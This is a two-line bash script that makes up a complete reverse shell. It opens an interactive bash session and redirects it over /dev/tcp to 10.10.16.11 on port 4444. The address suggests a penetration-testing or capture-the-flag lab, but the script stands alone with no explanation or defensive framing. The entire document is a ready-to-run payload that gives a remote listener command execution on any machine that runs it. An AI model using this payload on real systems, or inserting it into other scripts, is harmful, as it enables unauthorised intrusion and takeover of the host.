#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.16.11/4444 0>&1
